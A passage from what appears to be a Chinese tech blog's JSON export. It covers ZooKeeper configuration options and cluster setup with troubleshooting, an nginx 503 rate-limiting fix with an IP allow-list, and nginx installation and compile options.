并且配置的变量名称和系统属性不一样。 maxClientCnxns没有对应的 Java 系统属性 在 socket 级别限制单个客户端到 ZooKeeper 集群中单台服务器的并发连接数量, 可以通过 IP 地址来区分不同的客户端。它用来阻止某种类型的 DoS 攻击, 包括文件描述符资源耗尽。默认值是 60。将值设置为 0 将完全移除并发连接的限制。 clientPortAddress服务器监听客户端连接的地址 (ipv4, ipv6 或 主机名) , 亦即客户端尝试连接到服务器上的地址。该参数是可选的, 默认我们以这样一种方式绑定, 即对于服务器上任意 address/interface/nic, 任何连接到 clientPort 的请求将会被接受。 minSessionTimeout没有对应的 Java 系统属性 服务器允许客户端会话的最小超时时间, 以毫秒为单位。默认值是 2 倍的 tickTime。 maxSessionTimeout没有对应的 Java 系统属性 服务器允许客户端会话的最大超时时间, 以毫秒为单位。默认值是 20 倍的 tickTime。 fsync.warningthresholdms对应的 Java 系统属性: fsync.warningthresholdms。 用于配置 ZooKeeper 进行事务日志 (WAL) fsync 操作消耗时间的报警阈值, 一旦超过这个阈值将会打印输出报警日志。该参数的默认值是 1000, 以毫秒为单位。参数值只能作为系统属性来设置。 autopurge.snapRetainCount没有对应的 Java 系统属性。 当启用自动清理功能后, ZooKeeper 将只保留 autopurge.snapRetainCount 个最近的数据快照(dataDir)和对应的事务日志文件(dataLogDir), 其余的将会删除掉。默认值是 3。最小值也是 3。 autopurge.purgeInterval没有对应的 Java 系统属性。 用于配置触发清理任务的时间间隔, 以小时为单位。要启用自动清理, 可以将其值设置为一个正整数 (大于 1) 。默认值是 0。 syncEnabled对应的 Java 系统属性: zookeeper.observer.syncEnabled。 和参与者一样, 观察者现在默认将事务日志以及数据快照写到磁盘上, 这将减少观察者在服务器重启时的恢复时间。将其值设置为 “false” 可以禁用该特性。默认值是 “true”。 集群配置选项 本节中的选项主要用于ZooKeeper集群。 electionAlg没有对应的 Java 系统属性。 用于选择使用的 leader 选举算法。”0” 对应于原始的基于 UDP 的版本, “1” 对应于快速 leader 选举基于UDP的无身份验证的版本, “2” 对应于快速 leader 选举有基于UDP的身份验证的版本, 而 “3” 对应于快速 leader 选举基于TCP的版本。目前默认值是算法 3。 注意: leader 选举 0, 1, 2 这三种实现已经废弃, 在接下来的版本中将会移除它们, 这样就只剩下 FastLeaderElection 算法。 initLimit没有对应的 Java 系统属性。 默认值是 10, 即 tickTime 属性值的 10 倍。它用于配置允许 followers 连接并同步到 leader 的最大时间。如果 ZooKeeper 管理的数据量很大的话可以增加这个值。 leaderServes对应的 Java 系统属性: zookeeper.leaderServes。 用于配置 Leader 是否接受客户端连接, 默认值是 “yes”, 即 leader 将会接受客户端连接。在 ZooKeeper 中, leader 服务器主要协调事务更新请求。对于事务更新请求吞吐很高而读取请求吞吐很低的情况可以配置 leader 不接受客户端连接, 这样就可以专注于协调工作。 注意: 当 ZooKeeper 集群中服务器的数量超过 3 个时, 建议开启 leader 选举。 server.x=[hostname]:nnnnn:nnnnn没有对应的 Java 系统属性。 组成 ZooKeeper 集群的服务器。当服务器启动时, 可以通过查找数据目录中的 myid 文件来决定它是哪一台服务器。myid 文件包含服务器编号, 并且它要匹配 “server.x” 中的 x。 客户端用来组成 ZooKeeper 集群的服务器列表必须和每个 ZooKeeper 服务器中配置的 ZooKeeper 服务器列表相匹配。 有两个端口号 nnnnn, 第一个是 followers 用来连接到 leader, 第二个是用于 leader 选举。如果想在单台机器上测试多个服务, 则可以为每个服务配置不同的端口。 syncLimit没有对应的 Java 系统属性。 默认值是 5, 即 tickTime 属性值的 5 倍。它用于配置leader 和 followers 间进行心跳检测的最大延迟时间。如果在设置的时间内 followers 无法与 leader 进行通信, 那么 followers 将会被丢弃。 group.x=nnnnn[:nnnnn]没有对应的 Java 系统属性。 Enables a hierarchical quorum construction.”x” 是一个组的标识, 等号右边的数字对应于服务器的标识. 赋值操作右边是冒号分隔的服务器标识。注意: 组必须是不相交的, 并且所有组联合后必须是 ZooKeeper 集群。 weight.x=nnnnn没有对应的 Java 系统属性。 和 “group” 一起使用, 当形成集群时它给每个服务器赋权重值。这个值对应于投票时服务器的权重。ZooKeeper 中只有少数部分需要投票, 比如 leader 选举以及原子的广播协议。服务器权重的默认值是 1。如果配置文件中定义了组, 但是没有权重, 那么所有服务器的权重将会赋值为 1。 cnxTimeout对应的 Java 系统属性: zookeeper.cnxTimeout。 用于配置 leader选举过程中，打开一次连接（选举的 server 互相通信建立连接）的超时时间。默认值是 5s。 身份认证和授权选项本节的选项允许通过身份认证和授权来控制服务执行。 zookeeper.DigestAuthenticationProvider.superDigest 对应的 Java 系统属性: zookeeper.DigestAuthenticationProvider.superDigest。 该功能默认是禁用的。 能够使 ZooKeeper 集群管理员可以作为一个 “super” 用户来访问 znode 层级结构。特别是对于一个已经认证为超级管理员的用户不需要 ACL 检查。 org.apache.zookeeper.server.auth.DigestAuthenticationProvider 可以用来生成 superDigest, 调用它带有 “super:“ 参数的方法。当启动集群中的每台服务器时, 将生成的 “super:“ 作为系统属性提供。 当 ZooKeeper 客户端向 ZooKeeper 服务器进行身份认证时, 会传递一个 “digest” 和 “super:“ 的认证数据. 注意摘要式身份验证将认证数据以普通文本的形式传递给服务器, 在网络中需要谨慎使用该认证方法, 要么只在本机上或通过一个加密的连接。 实验性选项/特性本节列举了一些目前还处于实验阶段的新特性。 服务器只读模式对应的 Java 系统属性: readonlymode.enabled。 将其设置为 true 将会启用服务器只读模式支持, 默认是禁用的。ROM 允许请求了 ROM 支持的客户端会话连接到服务器, 即使当服务器可能已经从集群中分隔出去。在该模式中, ROM 客户端仍然可以从 ZK 服务中读取值, 但是不能进行写操作以及看见其它客户端所做的一些变更。更多详细信息可以参见 ZOOKEEPER-784 获取更多详细信息。 不安全的选项下面的选项会很有用, 但是使用的时候需要特别小心。 forceSync对应的 Java 系统属性: zookeeper.forceSync。 用于配置是否需要在事务日志提交的时候调用 FileChannel.force 来保证数据完全同步到磁盘。默认值是 “yes”。如果该选项设置为 “no”, ZooKeeper 将不会强制同步事务更新日志到磁盘。 jute.maxbuffer:对应的 Java 系统属性: jute.maxbuffer。没有 zookeeper 前缀。 用于指定一个 znode 中可以存储数据量的最大值, 默认值是 0xfffff, 或 1M 内。如果这个选项改变了, 那么该系统属性必须在所有的服务端和客户端进行设置, 否则会出现问题。ZooKeeper 是按照字节大小顺序来存储数据的。 skipACL对应的 Java 系统属性: zookeeper.skipACL。 用于配置 ZooKeeper 服务器跳过 ACL 权限检查。这将一定程度的提高服务器吞吐量, 但是也向所有客户端完全开放数据访问。 quorumListenOnAllIPs当设置为 true 时, ZooKeeper 服务器将会在所有可用的 IP 地址上监听来自其对等点的连接请求, 而不仅是配置文件的服务器列表中配置的地址。它会影响处理 ZAB 协议和 Fast Leader Election 协议的连接。默认值是 false。","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://blog.yangcvo.me/categories/大数据/"}],"tags":[{"name":"Big data Hadoop","slug":"Big-data-Hadoop","permalink":"http://blog.yangcvo.me/tags/Big-data-Hadoop/"},{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://blog.yangcvo.me/tags/ZooKeeper/"}]},{"title":"ZooKeeper集群快速搭建与优化","slug":"大数据hadoop/zookeeper/ZooKeeper集群快速搭建与优化","date":"2016-05-28T06:46:00.000Z","updated":"2017-03-27T03:10:58.000Z","comments":true,"path":"2016/05/28/大数据hadoop/zookeeper/ZooKeeper集群快速搭建与优化/","link":"","permalink":"http://blog.yangcvo.me/2016/05/28/大数据hadoop/zookeeper/ZooKeeper集群快速搭建与优化/","excerpt":"","text":"ZooKeeper集群快速搭建与优化之前搞过了hadoop和spark，hue，现在在弄下zookeeper集群，文档就整理下。本文是ZooKeeper的快速搭建,旨在帮助大家以最快的速度完成一个ZK集群的搭建,以便开展其它工作。 集群：本文使用了3台机器部署ZooKeeper集群，IP和主机名对应关系如下： 1234IP 主机名10.46.72.172 namenode10.47.88.103 datenode110.47.88.206 datenode2 安装说明Zookeeper机器间不需要设置免密码登录，其它hadoop也可以不设置，只要不使用hadoop-daemons.sh来启动、停止进程，注意不是hadoop-daemon.sh，而是带“s”的那个，带“s”的会读取hadoop的salves文件，远程ssh启动DataNode和备NameNode等。 配置/etc/hosts将3台机器的IP和主机名映射关系，在3台机器上都配置一下，亦即在3台机器的/etc/hosts文件中，均增加以下内容（可以先配置好一台，然后通过scp等命令复制到其它机器上，注意主机名不能包含任何下划线）： 1234567127.0.0.1 localhost namenode::1 localhost localhost.localdomain localhost6 localhost6.localdomain610.47.100.90 salt10.46.72.172 namenode10.47.88.103 datenode110.47.88.206 datenode210.47.102.137 datenode3 Step1:配置 JAVA 环境。检验方法:执行 java –version 和 javac –version 命令。 下载并解压 zookeeper。链接一 ，链接二 (更多版本:http://dwz.cn/37HGI) Step2:2.zookeeper的环境变量的配置：为了今后操作方便，我们需要对Zookeeper的环境变量进行配置，方法如下：在/etc/profile文件中加入如下的内容： 1234#set zookeeper environmentexport ZOOKEEPER_HOME=/srv/hadoop/zookeeper-3.3.6export PATH=$PATH:$ZOOKEEPER_HOME/bin:$ZOOKEEPER_HOME/conf Step3:下载以后解压到我自己新建的： 12[hadoop@namenode ~]$ tar -zxvf zookeeper-3.3.6.tar.gz -C /srv/hadoop/[hadoop@namenode ]$ cd /srv/hadoop/zookeeper-3.3.6/conf/ 将zoo_sample.cfg拷贝一份命名为zoo.cfg,这里我拷贝一份命名为：zoo.cfg 1[hadoop@namenode conf]$ cp -r zoo_sample.cfg zoo.cfg 这里先创建/data和/logs 这两个目录。 12mkdir -p /srv/hadoop/zookeeper-3.3.6/zookeeper/datamkdir -p /srv/hadoop/zookeeper-3.3.6/zookeeper/logs 注意上图的配置中master，slave1分别为主机名。 在上面的配置文件中&quot;server.id=host:port:port&quot;中的第一个port是从机器（follower）连接到主机器（leader）的端口号，第二个port是进行leadership选举的端口号。 修改配置： vi zoo.cfg，修改有的默认存在，添加红色的内容： 1234567891011121314tickTime=2000clientPort=2181initLimit=10syncLimit=5maxClientCnxns=0 这个是设置连接数0没有做限制dataDir=/haozhuo/hadoop/zookeeper-3.3.6/zookeeper/datadataLogDir=/haozhuo/hadoop/zookeeper-3.3.6/zookeeper/logsserver.0=namenode:2888:3888server.1=datanode1:2888:3888server.2=datanode2:2888:3888 创建maid:这里所有节点都需要创建。接下来在dataDir所指定的目录下创建一个文件名为myid的文件，文件中的内容只有一行，为本主机对应的id值，也就是上图中server.id中的id。例如：在服务器1中的myid的内容应该写入1。创建myid：在zoo.cfg配置文件中的dataDir的目录下面创建myid，每个节点myid要求不一样： 12cd /srv/hadoop/zookeeper-3.3.6/zookeeper/datatouch myid Step4:远程复制分发安装文件最好是把文件打包scp过去接下来将上面的安装文件拷贝到集群中的其他机器上对应的目录下： 123haduser@master:~/zookeeper$ scp -r zookeeper-3.4.5/ slave1:/srv/hadoop/haduser@master:~/zookeeper$ scp -r zookeeper-3.4.5/ slave2:/srv/hadoop/ 拷贝完成后修改对应的机器上的myid。例如修改slave1中的myid如下： 12345haduser@slave1:~/zookeeper/zookeeper-3.4.5$ echo \"2\" &gt; data/myidhaduser@slave1:~/zookeeper/zookeeper-3.4.5$ cat data/myid[hadoop@namenode hadoop]$ echo 0 &gt; /haozhuo/hadoop/zookeeper-3.3.6/zookeeper/data/myid[hadoop@datanode1 hadoop]$ echo 1 &gt; /haozhuo/hadoop/zookeeper-3.3.6/zookeeper/data/myid[hadoop@datanode2 hadoop]$ echo 2 &gt; /haozhuo/hadoop/zookeeper-3.3.6/zookeeper/data/myid Step5:启动 ZooKeeper集群在ZooKeeper集群的每个结点上，执行启动ZooKeeper服务的脚本，如下所示： 12345hadoop@namenode:~ /srv/hadoop/zookeeper-3.3.6/bin/zkServer.sh starthadoop@datanode1:~ /srv/hadoop/zookeeper-3.3.6/bin/zkServer.sh starthaduser@datanode2:~ /srv/hadoop/zookeeper-3.3.6/bin/zkServer.sh start 执行 1/haozhuo/hadoop/zookeeper-3.3.6/bin/zkServer.sh start Step6:检测是否成功启动:执行 jps 124933 QuorumPeerMain 其中，QuorumPeerMain是zookeeper进程，启动正常。 ./zkServer.sh status 查看当前运行状态。 namenode1 1234567891011121314[hadoop@namenode zookeeper-3.3.6]# ./zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgMode: follower[hadoop@datanode1 zookeeper-3.3.6]# ./bin/zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgMode: leader[hadoop@datanode2 zookeeper-3.3.6]# ./bin/zkServer.sh statusJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgMode: leader Step7:如果单台可以其他几台不行，看配置，如果没有问题。启动查看状态出现异常。 异常解决:Error contacting service. It is probably not running. 而其他一个节点却是现实正常; 先stop 掉原zk zkServer.sh stop 然后以start-foreground方式启动，会看到启动日志 zkServer.sh start 当出现问题的时候，记得查看日志zookeeper.out，在你配置的dataDir（在conf/zoo.cfg中查看）目录下。 123456789101112132015-12-29 11:09:38,034 [myid:1] - WARN [WorkerSender[myid=1]:QuorumCnxManager@400] - Cannot open channel to 3 at election address Node2/10.0.0.102:38888java.net.ConnectException: 拒绝连接 at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:339) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:200) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:182) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:579) at org.apache.zookeeper.server.quorum.QuorumCnxManager.connectOne(QuorumCnxManager.java:381) at org.apache.zookeeper.server.quorum.QuorumCnxManager.toSend(QuorumCnxManager.java:354) at org.apache.zookeeper.server.quorum.FastLeaderElection$Messenger$WorkerSender.process(FastLeaderElection.java:452) at org.apache.zookeeper.server.quorum.FastLeaderElection$Messenger$WorkerSender.run(FastLeaderElection.java:433) at java.lang.Thread.run(Thread.java:745) 可以看到是连接到Node2的3888端口不通（我配置文件设置的节点端口，server.3=Node2:2888:3888），这样就找到问题了，所以当遇到问题的时候记得查看日志文件，这才是最有帮助的，而不是修改什么nc参数。 这里主要看下是否加入hosts 查看Node2节点发现，38888端口绑带到127.0.0.1上了，这让Master节点怎么连接呀，只需修改/etc/hosts文件即可，同理，修改Node1，然后重启zookeeper，发现问题解决。 1234567127.0.0.1 localhost namenode::1 localhost localhost.localdomain localhost6 localhost6.localdomain610.47.100.90 salt10.46.72.172 namenode10.47.88.103 datenode110.47.88.206 datenode210.47.102.137 datenode3 这里我127.0.0.1 localhost namenode 就可以了。 Step8: 如何扩容zookeeper？只需要将已有的zookeeper打包复制到新的机器上，然后修改myid文件并设置好，然后启动zookeeper即可。 设置开机自动启动1.写个启动脚本放到/etc/rc.d/init.d/zookeeper 这里touch zookeeper &amp;&amp; chmod +x zookeeper &amp;&amp; vim zookeeper 12345678910111213!/bin/bash#chkconfig:2345 20 90#description:zookeeper#processname:zookeeperexport JAVA_HOME=/srv/jdk1.8.0_66export PATH=$JAVA_HOME/bin:$PATHcase $1 in start) su root /srv/zookeeper-3.3.6/bin/zkServer.sh start;; stop) su root /srv/zookeeper-3.3.6/bin/zkServer.sh stop;; status) su root /srv/zookeeper-3.3.6/bin/zkServer.sh status;; restart) su root /srv/zookeeper-3.3.6/bin/zkServer.shrestart;; *) echo \"requirestart|stop|status|restart\" ;;esac 2.设置开机启动 1chkconfig zookeeper on 3 验证 12chkconfig --add zookeeperchkconfig --list zookeeper 这个时候我们就可以用service zookeeper start/stop来启动停止zookeeper服务了.使用chkconfig--add zookeeper命令把zookeeper添加到开机启动里面添加完成之后接这个使用chkconfig--list来看看我们添加的zookeeper是否在里面如果上面的操作都正常的话；重启服务器测试就行。 注意：zookeeper重启出现几种报错：1. 启动服务报错找不到指定好的pid文件。2. 关闭服务报错没有在/tmp/路径下面没有/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid 123456789101112[root@zookeeper zookeeper-3.3.6]# ./bin/zkServer.sh startJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStarting zookeeper ... ./bin/zkServer.sh: line 93: [: /tmp/zookeeper: binary operator expected./bin/zkServer.sh: line 103: /tmp/zookeeper/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid: 没有那个文件或目录FAILED TO WRITE PID[root@zookeeper zookeeper-3.3.6]# ./bin/zkServer.sh stopJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStopping zookeeper ... no zookeeper to stop (could not find file /tmp/zookeeper/srv/zookeeper-3.3.6/zookeeper/data/zookeeper_server.pid) 解决方法：网上很少有人讲这么详细，这里我就说下，就是你在修改zoo.cfg配置文件里面： dataDir指定的路径是自定义的话等于的时候不要空格写。 如果重新另外写dataDir ,不要注释掉之前的，最好直接删除，重新指定这样就不会报错了，如果注释掉默认的#dataDir = /tmp这里需要空格。 报错 占用端口：123JMX enabled by defaultUsing config: /opt/app/zookeeper/bin/../conf/zoo3.cfgStarting zookeeper ... STARTED 查看状态：用jps命令查看进程： 1234567# jps24617 QuorumPeerMain （这个就是zookeeper进程）/opt/app/zookeeper/bin/zkServer.sh status zoo1.cfgJMX enabled by defaultUsing config: /opt/app/zookeeper/bin/../conf/zoo1.cfgError contacting service. It is probably not running. Ihaozhuo_b3314说明有错误，查看日志文件： 12345# cd &lt;zookeeper_home&gt;# less zookeeper.outjava.net.BindException: 地址已在使用杀掉当前进程：# kill -9 24617 报错: 启动服务正常。1234[root@api1 zookeeper-3.3.6]# ./bin/zkServer.sh startJMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStarting zookeeper ... STARTED 可是查询进程不存在，可是看pid是有的，然后关闭服务就说没有这个进程。 123JMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStopping zookeeper ... ./zkServer.sh: line 133: kill: (31415) - 没有那个进程 走kafka查看是否所有节点都启动：1234567891011121314[root@kafka_03 bin]# sh zkCli.shConnecting to localhost:21812017-01-04 19:20:24,849 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:host.name=kafka_032017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_662017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/log4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib[zk: localhost:2181(CONNECTED) 0] ls /[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp][zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids[0, 1, 2] kafka 三台集群这里可以看到获取到ids。 Step9: 相关文档《HBase-0.98.0分布式安装指南》 《Hive 0.12.0安装指南》 《ZooKeeper-3.4.6分布式安装指南》 《Hadoop 2.3.0源码反向工程》 《在Linux上编译Hadoop-2.4.0》 《Accumulo-1.5.1安装指南》 《Drill 1.0.0安装指南》 《Shark 0.9.1安装指南》 更多，敬请关注技术博客：http://blog.yangcvo.me Step10: 结束语至此，ZooKeeper分布式安装大告成功！更多细节，请浏览官方文档","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://blog.yangcvo.me/categories/大数据/"}],"tags":[{"name":"Big data Hadoop","slug":"Big-data-Hadoop","permalink":"http://blog.yangcvo.me/tags/Big-data-Hadoop/"}]},{"title":"Nginx解决办法-503-Service.Temporarily.Unavailable","slug":"Web服务技术/Nginx/nginx解决办法-503-Service.Temporarily.Unavailable","date":"2016-05-24T09:25:23.000Z","updated":"2017-03-31T10:17:26.000Z","comments":true,"path":"2016/05/24/Web服务技术/Nginx/nginx解决办法-503-Service.Temporarily.Unavailable/","link":"","permalink":"http://blog.yangcvo.me/2016/05/24/Web服务技术/Nginx/nginx解决办法-503-Service.Temporarily.Unavailable/","excerpt":"","text":"503 Service Temporarily Unavailable 解决办法-nginx因为最近公司微信抽奖活动项目环境 - ginx做负载均衡限制某个IP同一时间段的访问次数。 就是防止有人同一个IP不断请求，网站刷新后经常出现503 Service Temporarily Unavailable错误，有时有可以，联想到最近在nginx.conf里做了单ip访问次数限制. (limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s;) 把这个数量放大后在刷新发现问题解决。 123456789vim nginx.confhttp &#123; limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; 添加上面那条语句就行。 include mime.types; default_type application/octet-stream; （还顺便把这个改大了 limit_req zone=allips burst=50 nodelay; ）为了证实该问题，反复改动该数量测试发现问题确实在这。这个数量设得太小有问题，通过fiddler发现web页面刷新一下，因为页面上引用的js,css,图片都算一个连接。所以单个页面刷新下就有可能刷爆这个限制，超过这个限制就会提示503 Service Temporarily Unavailable。 这里添加下只能设置什么IP网段可以访问www.ihaozhuo.com。其他的全部拒绝访问80端口这个域名www.ihaozhuo.com。 12345678910111213141516 server &#123; listen 80; allow 218.17.158.2;allow 127.0.0.0/24;allow 192.168.0.0/16;allow 58.251.130.1;allow 183.239.167.3;allow 61.145.164.1;deny all;server_name www.ihaozhuo.com; location / &#123; proxy_pass http://www.ihaozhuo.com;proxy_set_header X-Real-IP $remote_addr;limit_req zone=allips burst=50 nodelay; &#125; &#125;","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nginx多种安装与配置文件详解","slug":"Web服务技术/Nginx/Nginx多种安装与配置文件详解","date":"2016-05-23T09:25:23.000Z","updated":"2017-04-21T02:41:44.000Z","comments":true,"path":"2016/05/23/Web服务技术/Nginx/Nginx多种安装与配置文件详解/","link":"","permalink":"http://blog.yangcvo.me/2016/05/23/Web服务技术/Nginx/Nginx多种安装与配置文件详解/","excerpt":"","text":"安装nginx最近在弄灰度发布环境，之前nginx在测试和线上都有搭建配置。负载均衡配置（包括健康检查）、缓存（包括清空缓存）反向代理。就打算自己整理篇自己操作的文档，各种编译配置，今天自己也整理一份安装文档和nginx.conf配置选项的说明。 选择稳定版本 我们编译安装nginx来定制自己的模块。 机器CentOS 6.6 x86_64。 软件版本：Nginx 1.9.9 nginx最新安装包下载地址：http://www.nginx.cn/ng yum 一键安装nginxyum安装rpm包会比编译安装简单很多，默认会安装许多模块，帮我们解决到很多依赖的安装包，但缺点是如果你想以后安装第三方模块那就没办法了。 使用Nginx官方源,Epel扩展库和remi源,remi源基于epel,必须先安装epel源,remi包含php-fpm,mysql-server5.5,如果只需要php-fpm可以单独安装php-fpm后禁用此源. 第一种方法:123456# vi /etc/yum.repo.d/nginx.repo[nginx]name=nginx repobaseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=0enabled=1 剩下的就yum install nginx搞定，也可以yum install nginx-1.11.10安装指定版本（前提是你去packages里看到有对应的版本，默认是最新版稳定版） 第二种方法:各节点时间同步 [root@nginx ~]# ntpdate 202.120.2.101 安装EPEL源: 12345rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm yum clean all yum makecache yum install -y nginx service nginx start 还有一种就是下载Centos-6.repo ，可以到我github上面nginx库下载，这个是最新的源地址里面。nginx 编译安装：首先安装缺少的依赖包： 123456789101112 # yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel``` 这些软件包如果yum上没有的话可以下载源码来编译安装，只是要注意编译时默认安装的目录，确保下面在安装nginx时能够找到这些动态库文件（ldconfig）。nginx官网下载编译安装包地址:[nginx](http://nginx.org/en/download.html)nginx-1.11.10版本下载：[nginx-1.11.10](http://nginx.org/download/nginx-1.11.10.tar.gz)### 新建nginx用户与组``` bash groupadd www useradd -s /sbin/nologin -g www www 编译配置文件123456789101112131415161718192021222324252627282930313233 tar -zxvf nginx-1.11.10.tar.gz cd nginx-1.11.10/ ./configure --user=www --group=www --prefix=/usr/local/nginx --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module ./configure --user=www --group=www --prefix=/usr/local/nginx --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module``` 其中参数 `--with-http_stub_status_module `是为了启用 nginx 的 NginxStatus 功能，用来监控 Nginx 的当前状态。 make &amp;&amp; make install### 常用编译选项说明nginx大部分常用模块，编译时./configure --help以--without开头的都默认安装。```bash--prefix=PATH ： 指定nginx的安装目录。默认 /usr/local/nginx--conf-path=PATH ： 设置nginx.conf配置文件的路径。nginx允许使用不同的配置文件启动，通过命令行中的-c选项。默认为prefix/conf/nginx.conf--user=name： 设置nginx工作进程的用户。安装完成后，可以随时在nginx.conf配置文件更改user指令。默认的用户名是nobody。--group=name类似--with-pcre ： 设置PCRE库的源码路径，如果已通过yum方式安装，使用--with-pcre自动找到库文件。使用--with-pcre=PATH时，需要从PCRE网站下载pcre库的源码（版本4.4 - 8.30）并解压，剩下的就交给Nginx的./configure和make来完成。perl正则表达式使用在location指令和 ngx_http_rewrite_module模块中。--with-zlib=PATH ： 指定 zlib（版本1.1.3 - 1.2.5）的源码解压目录。在默认就启用的网络传输压缩模块ngx_http_gzip_module时需要使用zlib 。--with-http_ssl_module ： 使用https协议模块。默认情况下，该模块没有被构建。前提是openssl与openssl-devel已安装--with-http_stub_status_module ： 用来监控 Nginx 的当前状态--with-http_realip_module ： 通过这个模块允许我们改变客户端请求头中客户端IP地址值(例如X-Real-IP 或 X-Forwarded-For)，意义在于能够使得后台服务器记录原始客户端的IP地址--add-module=PATH ： 添加第三方外部模块，如nginx-sticky-module-ng或缓存模块。每次添加新的模块都要重新编译（Tengine可以在新加入module时无需重新编译） 再提供一种编译方案：最全方案的编译 12345678910111213141516171819./configure \\ --prefix=/usr \\ --sbin-path=/usr/sbin/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --error-log-path=/var/log/nginx/error.log \\ --http-log-path=/var/log/nginx/access.log \\ --pid-path=/var/run/nginx/nginx.pid \\ --lock-path=/var/lock/nginx.lock \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_stub_status_module \\--with-http_gzip_static_module \\ --http-client-body-temp-path=/var/tmp/nginx/client/ \\ --http-proxy-temp-path=/var/tmp/nginx/proxy/ \\ --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/ \\ --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi \\ --with-pcre=../pcre-7.8 --with-zlib=../zlib-1.2.3 编译完成后面执行安装：make 1234567891011121314151617181920212223242526272829303132creating objs/MakefileConfiguration summary + using system PCRE library + using system OpenSSL library + using system zlib library nginx path prefix: \"/usr/local/nginx\" nginx binary file: \"/usr/local/nginx/sbin/nginx\" nginx modules path: \"/usr/local/nginx/modules\" nginx configuration prefix: \"/usr/local/nginx/conf\" nginx configuration file: \"/usr/local/nginx/conf/nginx.conf\" nginx pid file: \"/usr/local/nginx/logs/nginx.pid\" nginx error log file: \"/var/log/nginx/error.log\" nginx http access log file: \"/var/log/nginx/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@nginx nginx-1.11.10]# make &amp;&amp; make installmake -f objs/Makefilemake[1]: Entering directory `/root/nginx-1.11.10'cc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/nginx.o \\ src/core/nginx.ccc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/ngx_log.o \\ src/core/ngx_log.ccc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\..... 启动nginx服务1234/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx ##做软连接cp nginx.init /etc/init.d/nginx 启动脚本chmod +x /etc/init.d/nginx 